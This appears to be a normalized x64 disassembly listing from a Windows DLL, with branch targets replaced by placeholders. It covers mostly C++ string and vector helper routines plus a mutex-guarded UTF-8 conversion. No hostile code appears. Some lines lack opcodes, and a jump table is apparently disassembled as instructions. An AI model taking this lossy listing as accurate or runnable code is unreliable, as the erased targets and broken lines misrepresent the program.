lea r8 [ rsp + 0x70 ]
mov edx [ rbx + 0xbc ]
call [ rax + 0x10 ]
jmp r-xdata
cmp [ r8 + 0x10 ] 0x2
jne r-xdata
mov r9 [ r8 + 0x10 ]
mov r8 [ r8 + 0x8 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_180005df0
nop
movzx r14d [ rsp + 0x20 ]
test r14w r14w
jne r-xdata
cmp [ r8 + 0x10 ] 0x8
jne r-xdata
cmp [ r8 + 0x10 ] 0x2
jne r-xdata
cmp [ r8 + 0x10 ] 0x8
jne r-xdata
cmp [ r8 + 0x10 ] 0x2
jne r-xdata
mov rcx rbx
call sub_180003750
mov [ rbx + 0xc0 ] 0x1
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ r8 + 0x8 ]
mov ecx [ rax ]
lea eax [ rcx - 0x1 ]
cmp eax 0x2932dfe
ja r-xdata
mov rax [ r8 + 0x8 ]
mov ecx [ rax ]
cmp [ rbx + 0xbc ] 0x0
jbe r-xdata
mov rax [ r8 + 0x8 ]
movzx r12d [ rax ]
mov rcx [ rbx + 0xa0 ]
sub rcx [ rbx + 0x98 ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov [ rbp - 0x68 ] r14w
movzx r15d [ rsp + 0x22 ]
mov [ rbp - 0x66 ] r15b
movzx eax [ rsp + 0x23 ]
mov [ rbp - 0x65 ] al
lea rdx [ rsp + 0x28 ]
lea rcx [ rbp - 0x60 ]
call sub_1800028f0
mov rcx [ rbx + 0x18 ]
mov rax [ rcx ]
lea rdx [ rbp - 0x68 ]
call [ rax + 0x28 ]
xor r12b r12b
mov rcx [ rbx + 0xa0 ]
sub rcx [ rbx + 0x98 ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rsp + 0x28 ] rax
jne r-xdata
mov rax [ r8 + 0x8 ]
mov rdi [ rax ]
test rdi rdi
je r-xdata
mov rax [ r8 + 0x8 ]
movzx esi [ rax ]
mov edi 0x1
mov rax [ rbx + 0x50 ]
sub rax [ rbx + 0x48 ]
sar rax 0x3
cmp rdi rax
jae r-xdata
mov rax [ r8 + 0x8 ]
mov rsi [ rax ]
test rsi rsi
je r-xdata
mov rax [ r8 + 0x8 ]
movzx r8d [ rax ]
mov edi 0x1
mov rcx [ rbx + 0xa0 ]
sub rcx [ rbx + 0x98 ]
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdi rdx
jae r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov [ rbx + 0xb8 ] ecx
jmp r-xdata
cmp ecx [ rbx + 0xb8 ]
ja r-xdata
mov rsi rdi
nop
lea rcx [ rsp + 0x28 ]
call sub_180002870
jmp r-xdata
nop [ rax + rax ] ax
lea rcx [ rsp + 0x28 ]
call sub_180002870
jmp r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x18 ]
test ax ax
je r-xdata
nop [ rax + rax ] ax
xor r12b r12b
mov rax [ rsi ]
lea rdx [ rbp - 0x8 ]
mov rcx rsi
call [ rax + 0x28 ]
mov edi 0x1
cmp [ rax ] 0x0
je r-xdata
mov rax [ rbx + 0x98 ]
lea rcx [ rax + 0x28 ]
mov [ rbx + 0xbc ] ecx
jmp r-xdata
inc rdi
add rsi 0x28
mov rcx [ rbx + 0xa0 ]
sub rcx [ rbx + 0x98 ]
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdi rdx
jb r-xdata
mov rcx [ rbx + 0x18 ]
mov rax [ rcx ]
movzx edx r12w
call [ rax + 0x20 ]
inc r12b
movzx edi r12b
mov rcx [ rbx + 0xa0 ]
sub rcx [ rbx + 0x98 ]
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdi rdx
jb r-xdata
mov [ rbp - 0x38 ] r14w
mov [ rbp - 0x36 ] r15b
movzx eax [ rsp + 0x23 ]
mov [ rbp - 0x35 ] al
lea rdx [ rsp + 0x28 ]
lea rcx [ rbp - 0x30 ]
call sub_1800028f0
lea rdx [ rbp - 0x38 ]
mov rcx rbx
call sub_1800051b0
mov r11 [ rbx + 0x98 ]
lea r8 [ r11 + rdi * 8 ]
lea rdx [ rbp + 0x78 ]
lea rcx [ rbx + 0x98 ]
call sub_1800064e0
lea rdx [ rsp + 0x20 ]
lea rcx [ rbx + 0x98 ]
call sub_180006aa0
movzx r15d [ rsp + 0x22 ]
movzx r14d [ rsp + 0x20 ]
mov [ rbp + 0x70 ] rdi
lea rcx [ rbx + 0x48 ]
lea rdx [ rbp + 0x70 ]
call sub_180002230
jmp r-xdata
mov rax [ rbx + 0x48 ]
lea rcx [ rax + rdi * 8 ]
mov r8 [ rbx + 0x50 ]
lea rdx [ rcx + 0x8 ]
sub r8 rdx
and r8 0xfffffffffffffff8
call sub_1800205e0
add [ rbx + 0x50 ] 0xfffffffffffffff8
jmp r-xdata
inc rdi
mov rax [ rbx + 0x50 ]
sub rax [ rbx + 0x48 ]
sar rax 0x3
cmp rdi rax
jb r-xdata
test r12b r12b
je r-xdata
lea rcx [ rbp ]
call sub_180002870
movzx r12d dil
jmp r-xdata
lea rdx [ rdi + rdi * 4 ]
lea r8 [ rax + rdx * 8 ]
lea rdx [ rbp - 0x10 ]
lea rcx [ rbx + 0x98 ]
call sub_1800064e0
jmp r-xdata
inc rdi
add rcx 0x28
cmp rdi rdx
jb r-xdata
mov rax [ rbx + 0x98 ]
cmp [ rsi + rax ] r12w
jne r-xdata
jmp r-xdata
lea rdi [ rdi + rdi * 4 ]
mov rax [ rbx + 0x98 ]
cmp [ rax + rdi * 8 ] r14w
jne r-xdata
mov rax [ rbx + 0x48 ]
mov rcx [ rax + rdi * 8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
cmp ax si
je r-xdata
jmp r-xdata
mov rdx rsi
mov rcx rbx
call sub_180006bd0
jmp r-xdata
test dil 0x1
je r-xdata
cmp [ rcx ] r8w
je r-xdata
jmp r-xdata
sub_1800072c1
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0xc
or al 0x2
add eax [ rsp + rcx ]
or al 0xc
or al 0xc
or al 0xc
add eax 0xc0c0c06
or al 0xc
or al 0xc
or al 0x7
or [ rcx ] cl
or cl [ rsp + rcx ]
or al 0xc
or al 0xc
or ecx esp
int3
sub_180007300
sub rsp 0x28
mov rax [ rcx + 0x10 ]
mov r10 rdx
cmp rax rdx
jae r-xdata
sub rax rdx
mov [ rsp + 0x20 ] rbx
cmp rax r8
cmovb r8 rax
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov r11 [ rsp + 0x50 ]
lea rcx [ rcx + r10 * 2 ]
cmp r8 r11
mov rdx r11
cmovb rdx r8
xor r10d r10d
or ebx 0xffffffff
test rdx rdx
je r-xdata
mov rcx [ rcx ]
mov edx r10d
movzx eax [ r9 ]
cmp [ rcx ] ax
jne r-xdata
mov rbx [ rsp + 0x20 ]
add rsp 0x28
retn
cmp r8 r11
jae r-xdata
cmp [ rcx ] ax
mov edx 0x1
cmovb edx ebx
jmp r-xdata
add rcx 0x2
add r9 0x2
dec rdx
jne r-xdata
setne r10b
mov eax r10d
mov eax ebx
mov rbx [ rsp + 0x20 ]
add rsp 0x28
retn
movsxd rax edx
test edx edx
jne r-xdata
sub_1800073b0
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
cmp rdx 0xffffffffffffffff
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
mov rcx rdx
call sub_180021000
test rax rax
jne r-xdata
sub_180007410
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
mov [ rsp + 0x10 ] dx
push r12
sub rsp 0x20
mov r9 [ rcx + 0x10 ]
or r12 0xffffffffffffffff
movzx esi dx
mov rdi rcx
cmp r9 0x1
jb r-xdata
mov rax r12
dec r9
cmp r8 r9
cmovb r9 r8
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rcx rdi
call sub_1800010b0
cmp rbx rax
je r-xdata
mov ecx 0x1
lea rdx [ rsp + 0x38 ]
mov r8 rbx
lea rbx [ rax + r9 * 2 ]
nop
sub rbx 0x2
jmp r-xdata
cmp [ r8 ] ax
mov ecx 0x1
cmovb ecx r12d
test ecx ecx
je r-xdata
add r8 0x2
add rdx 0x2
dec rcx
jne r-xdata
cmp [ rbx ] si
jne r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
movzx eax [ rdx ]
cmp [ r8 ] ax
jne r-xdata
sub rbx rdi
sar rbx 0x1
mov rax rbx
jmp r-xdata
mov rdi [ rdi ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_1800074e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rcx [ rcx ]
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + r11 ] 0x0
mov rax [ rbx ]
mov [ rax + r11 ] 0x0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rdx rcx
lea rcx [ rax + r9 ]
sub r8 rdi
add rdx rdi
call sub_1800205e0
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] r11
jb r-xdata
sub_180007580
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r12 r8
mov rbx rcx
mov rdi rdx
or rdi 0xf
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor esi esi
test rcx rcx
je r-xdata
mov rdi 0xfffffffffffffffe
mov rax rdi
sub rax rcx
cmp r8 rax
ja r-xdata
jmp r-xdata
cmp rcx 0xffffffffffffffff
ja r-xdata
lea rdi [ rcx + r8 ]
test r12 r12
je r-xdata
mov [ rsp + 0x88 ] 0x0
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_180020424
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
nop
call sub_180021000
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx ] 0x0
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r12
cmp rdi 0x10
cmovae rbx rsi
mov [ rbx + r12 ] 0x0
add rsp 0x48
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov r8 r12
mov rcx rsi
call sub_1800205e0
sub_1800076c0
push rdi
sub rsp 0x30
mov r10 rcx
or rcx 0xffffffffffffffff
mov rdi rdx
mov r8 [ r10 + 0x10 ]
xor eax eax
mov r9 rdx
[ rdi ]
xor edx edx
not rcx
dec rcx
mov [ rsp + 0x20 ] rcx
mov rcx r10
call sub_180007300
test eax eax
sete al
add rsp 0x30
pop rdi
retn
sub_180007700
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x60
xor edi edi
mov rsi rcx
cmp [ rcx + 0x28 ] rdi
je r-xdata
mov rax rdi
mov rcx [ rcx + 0x78 ]
test rcx rcx
je r-xdata
cmp [ rsi + 0x30 ] 0x8
lea rbx [ rsi + 0x18 ]
jb r-xdata
xor edx edx
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
mov r8 rbx
mov r8 [ rbx ]
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rdi
or r9d 0xffffffff
xor edx edx
mov ecx 0xfde9
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ WideCharToMultiByte@IAT ]
mov edx 0x1
movsxd rbp eax
add rbp 0x2
mov rcx rbp
call sub_180021308
mov r12 rax
test rax rax
jne r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov r8 rbx
mov r8 [ rbx ]
jmp r-xdata
mov [ rbx ] di
mov rbx [ rbx ]
mov [ rbx ] di
mov rcx [ rsi + 0x78 ]
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
mov rbx [ rbx ]
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rdi
or r9d 0xffffffff
xor edx edx
mov ecx 0xfde9
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp [ rbx + 0x18 ] 0x8
movsxd rbp eax
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
lea rax [ r--data ]
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x80 ] rax
call sub_180020424
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
call sub_1800210a4
int3
movzx ecx [ rw-data ]
mov [ rax ] edi
mov [ rax + 0x6 ] 0x64
mov [ rax + 0x4 ] cx
movzx ecx [ rw-data ]
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] rbp
mov rdi rax
mov [ rax + 0x7 ] cl
sub_1800078a0
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rdx 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x38 ] rsi
xor esi esi
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test r8b r8b
je r-xdata
mov r8 [ rcx + 0x10 ]
call sub_180007580
jmp r-xdata
test rdx rdx
jne r-xdata
cmp rdx 0x10
jae r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x48 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rsi
cmp rax 0x10
jb r-xdata
mov [ rsp + 0x30 ] rbp
mov rbp [ rcx + 0x10 ]
cmp rdx rbp
cmovb rbp rdx
cmp rax 0x10
jb r-xdata
mov [ rbx ] sil
mov rbx [ rcx ]
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] 0xf
mov [ rbx + rbp ] sil
mov rbp [ rsp + 0x30 ]
jmp r-xdata
mov [ rsp + 0x40 ] r12
mov r12 [ rcx ]
test rbp rbp
je r-xdata
mov rcx r12
call j_sub_18002094c#2
mov r12 [ rsp + 0x40 ]
mov r8 rbp
mov rdx r12
call sub_1800205e0
sub_180007970
push rsi
push rdi
sub rsp 0x28
mov rdi rdx
mov rdx [ rcx + 0x10 ]
mov rsi rcx
mov rcx 0xfffffffffffffff
mov rax rcx
sub rax rdx
cmp rax rdi
jae r-xdata
mov [ rsp + 0x40 ] rbx
mov r8d 0x8
mov [ rsp + 0x48 ] rbp
mov rax rdx
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x20 ] r14
shr rax 0x1
cmp rax r8
cmovb rax r8
cmp rdi rax
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbp [ rsi + 0x18 ]
lea rcx [ rsi + 0x29 ]
add rdx rdi
call sub_180013450
mov rcx [ rsi + 0x8 ]
mov rbx [ rsi + 0x10 ]
shl rbx 0x3
lea r13 [ rbp * 8 ]
mov r14 rax
lea rdx [ r13 + rcx ]
sub rbx rdx
add rbx rcx
lea rcx [ r13 + rax ]
and rbx 0xfffffffffffffff8
mov r8 rbx
call sub_1800205e0
mov rdx [ rsi + 0x8 ]
add rax rbx
mov rcx rax
cmp rbp rdi
ja r-xdata
sub rcx rax
cmp rdx rcx
cmovbe rdi rax
lea rbx [ rdi * 8 ]
mov r8 rbx
and r8 0xfffffffffffffff8
call sub_1800205e0
mov r11 [ rsi + 0x8 ]
mov rcx r14
lea rdx [ rbx + r11 ]
sub r13 rdx
add r13 r11
sar r13 0x3
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_1800205e0
add rax rbx
test rdi rdi
je r-xdata
sar r13 0x3
mov [ rsp + 0x50 ] r12
mov r12 rdi
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_1800205e0
add rax rbx
sub r12 rbp
je r-xdata
mov rcx [ rsi + 0x8 ]
mov r13 [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
mov r8 rdi
mov rcx rax
shl r8 0x3
mov r12 [ rsp + 0x50 ]
test rbp rbp
je r-xdata
shl r12 0x3
xor edx edx
mov rcx rax
mov r8 r12
call sub_180021150
add [ rsi + 0x10 ] rdi
mov [ rsi + 0x8 ] r14
mov r14 [ rsp + 0x20 ]
add rsp 0x28
pop rdi
pop rsi
retn
call j_sub_18002094c#2
shl rbp 0x3
mov rcx r14
mov r8 rbp
jmp r-xdata
xor edx edx
call sub_180021150
sub_180007b00
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
sub rax r8
mov r8 [ rcx + 0x10 ]
cmp rax r9
cmovb rbp rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_180007580
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
lea rdx [ rsi + r12 ]
mov r8 rbp
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_180007c20
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push r13
sub rsp 0x20
mov rsi r8
mov r8 [ rcx + 0x10 ]
mov rbp r9
mov r13 rdx
mov rbx rcx
cmp r8 rdx
jb r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov rax [ rsi + 0x10 ]
cmp rax r9
jb r-xdata
sub rax r9
mov [ rsp + 0x48 ] r12
mov r12 [ rsp + 0x60 ]
cmp rax r12
cmovb r12 rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax r12
ja r-xdata
mov [ rsp + 0x40 ] rdi
test r12 r12
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop rsi
pop rbp
retn
lea rdi [ r8 + r12 ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_180007580
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
cmp r13 rbp
jae r-xdata
mov r8 [ rbx + 0x10 ]
lea rdx [ rcx + r13 ]
lea rcx [ rax + r13 ]
sub r8 r13
add rcx r12
call sub_1800205e0
cmp rbx rsi
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax [ rbx + 0x18 ]
cmp rax 0x10
jb r-xdata
add rbp r12
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rdx [ rsi + rbp ]
lea rcx [ rax + r13 ]
mov r8 r12
call sub_1800205e0
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x10
jb r-xdata
mov [ rax + rdi ] 0x0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
lea rdx [ rcx + rbp ]
lea rcx [ rax + r13 ]
mov r8 r12
call sub_1800205e0
jmp r-xdata
sub_180007dd0
mov [ rsp + 0x18 ] rbx
push rbp
push r12
push r13
sub rsp 0x20
mov r12 r8
mov r8 [ rcx + 0x10 ]
mov rbp r9
mov r13 rdx
mov rbx rcx
cmp r8 rdx
jb r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov rax [ r12 + 0x10 ]
cmp rax r9
jb r-xdata
sub rax r9
mov [ rsp + 0x40 ] rsi
mov rsi [ rsp + 0x60 ]
cmp rax rsi
cmovb rsi rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rsi
ja r-xdata
mov [ rsp + 0x48 ] rdi
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rbp
retn
lea rdi [ r8 + rsi ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001300
test rdi rdi
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
cmp r13 rbp
jae r-xdata
mov r8 [ rbx + 0x10 ]
lea rax [ r13 + rsi ]
lea rdx [ rdx + r13 * 2 ]
sub r8 r13
lea rcx [ rcx + rax * 2 ]
add r8 r8
call sub_1800205e0
cmp rbx r12
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r12 [ r12 ]
mov rax [ rbx + 0x18 ]
cmp rax 0x8
jb r-xdata
add rbp rsi
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea r8 [ rsi + rsi ]
lea rdx [ r12 + rbp * 2 ]
lea rcx [ rax + r13 * 2 ]
call sub_1800205e0
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
lea rdx [ rcx + rbp * 2 ]
lea r8 [ rsi + rsi ]
lea rcx [ rax + r13 * 2 ]
call sub_1800205e0
jmp r-xdata
sub_180007f90
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
cmp [ rbx + 0x50 ] 0x8
jb r-xdata
call sub_18002094c
xor edi edi
mov [ rbx + 0x50 ] 0x7
mov [ rbx + 0x48 ] rdi
mov [ rbx + 0x38 ] di
cmp [ rbx + 0x28 ] 0x10
jb r-xdata
mov rcx [ rbx + 0x38 ]
call j_sub_18002094c#2
mov [ rbx + 0x28 ] 0xf
mov [ rbx + 0x20 ] rdi
mov [ rbx + 0x10 ] dil
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x10 ]
call j_sub_18002094c#2
sub_180008000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rdx + 0x10 ]
mov rbp r8
mov rsi rdx
mov rbx rcx
cmp rdi r8
jae r-xdata
sub rdi r8
cmp r9 rdi
cmovb rdi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_18001f714
cmp rdi 0xfffffffffffffffe
jbe r-xdata
lea rdx [ rdi + r8 ]
or r8 0xffffffffffffffff
call sub_1800074e0
mov r8 rbp
xor edx edx
mov rcx rbx
call sub_1800074e0
jmp r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test rdi rdi
jne r-xdata
mov r8 [ rcx + 0x10 ]
mov rdx rdi
call sub_180007580
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rdx [ rsi + rbp ]
mov r8 rdi
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_180008110
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
cmp r8 0x10
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_180007580
test rdi rdi
je r-xdata
cmp r8 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
